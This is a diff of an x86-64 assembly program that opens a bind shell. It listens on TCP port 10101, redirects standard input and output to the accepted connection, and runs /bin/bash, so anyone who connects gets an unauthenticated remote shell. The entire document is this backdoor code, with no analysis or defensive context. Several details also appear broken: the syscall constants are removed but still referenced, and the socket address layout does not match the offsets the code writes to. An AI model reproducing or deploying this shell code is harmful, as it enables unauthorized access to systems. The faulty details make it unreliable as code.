@@ -1,88 +1,82 @@
-.data
-    sockfd:     .quad 0
-    fd:         .quad 0
-    my_sin:     .space 16         /* allocate 16 bytes for sockaddr_in structure */
-    sin_family: .word 0
-    sin_port:   .word 0x7527      /* htons(10101) */
-    sin_addr:   .long 0           /* Changed quad to long */
-    sin_zero:   .space 8          /* Changed quad to space */
+.section .data
+    sockfd:
+        .long 0
+    fd:
+        .long 0
+    bash:
+        .asciz "/bin/bash"
 
-.text
-.global main
-main:
-    /* Create socket */
+.section .bss
+    sin:
+        .fill 8, 1, 0
+        .word 0x7527
+        .fill 8, 1, 0
+
+.section .text
+.globl _start
+_start:
+    # Create socket
     movq $SYS_SOCKET, %rax
     movq $AF_INET, %rdi
     movq $SOCK_STREAM, %rsi
     movq $IPPROTO_TCP, %rdx
     syscall
-    movq %rax, sockfd
+    movq %rax, sockfd(%rip)
 
-    /* Fill in sockaddr_in structure */
-    movw $AF_INET, sin_family
-    movw $10101, %ax           /* PORT = 10101 */
-    xchgb %ah, %al             /* htons(), AH ⇔ AL */
-    movw %ax, sin_port
-    movq %rdx, sin_addr
+    # Prepare sockaddr_in structure
+    movw $AF_INET, sin(%rip)
+    movw $10101, %ax
+    xchg %ah, %al
+    movw %ax, sin+2(%rip)
 
-    /* Bind socket */
+    # Bind
     movq $SYS_BIND, %rax
-    movq sockfd, %rdi
-    leaq my_sin, %rsi          /* address of my_sin structure */
-    movq $0x10, %rdx           /* sizeof(sockaddr_in) = 16 */
+    movq sockfd(%rip), %rdi
+    leaq sin(%rip), %rsi
+    movq $16, %rdx
     syscall
 
-    /* Listen on socket */
+    # Listen
     movq $SYS_LISTEN, %rax
-    movq sockfd, %rdi
+    movq sockfd(%rip), %rdi
     movq $1, %rsi
     syscall
 
-    /* Accept connection */
+    # Accept
     movq $SYS_ACCEPT, %rax
-    movq sockfd, %rdi
-    movq $0, %rsi
+    movq sockfd(%rip), %rdi
+    xorq %rsi, %rsi
+    xorq %rdx, %rdx
+    syscall
+    movq %rax, fd(%rip)
+
+    # Duplicate file descriptors
+    movq $SYS_DUP2, %rax
+    movq fd(%rip), %rdi
+    xorq %rsi, %rsi
     movq $0, %rdx
     syscall
-    movq %rax, fd
 
-    /* Redirect stdin, stdout, stderr to the socket */
     movq $SYS_DUP2, %rax
-    movq fd, %rdi
-    movq $0, %rsi
-    syscall
-    movq $SYS_DUP2, %rax
-    movq fd, %rdi
+    movq fd(%rip), %rdi
     movq $1, %rsi
+    movq $0, %rdx
     syscall
+
     movq $SYS_DUP2, %rax
-    movq fd, %rdi
+    movq fd(%rip), %rdi
     movq $2, %rsi
+    movq $0, %rdx
     syscall
 
-    /* Execute /bin/bash */
+    # Execute /bin/bash
     movq $SYS_EXECVE, %rax
-    movq $bash, %rdi
-    xor %rsi, %rsi
-    xor %rdx, %rdx
+    leaq bash(%rip), %rdi
+    xorq %rsi, %rsi
+    xorq %rdx, %rdx
     syscall
 
-    /* Exit */
+    # Exit
     movq $SYS_EXIT, %rax
-    xor %rdi, %rdi
+    xorq %rdi, %rdi
     syscall
-
-.data
-    SYS_SOCKET:  .quad 41
-    SYS_BIND:    .quad 49
-    SYS_LISTEN:  .quad 50
-    SYS_ACCEPT:  .quad 43
-    SYS_DUP2:    .quad 33
-    SYS_EXECVE:  .quad 59
-    SYS_EXIT:    .quad 60
-    AF_INET:     .quad 2
-    SOCK_STREAM: .quad 1
-    IPPROTO_TCP: .quad 6
-    bash:        .asciz "/bin/bash"
-
-
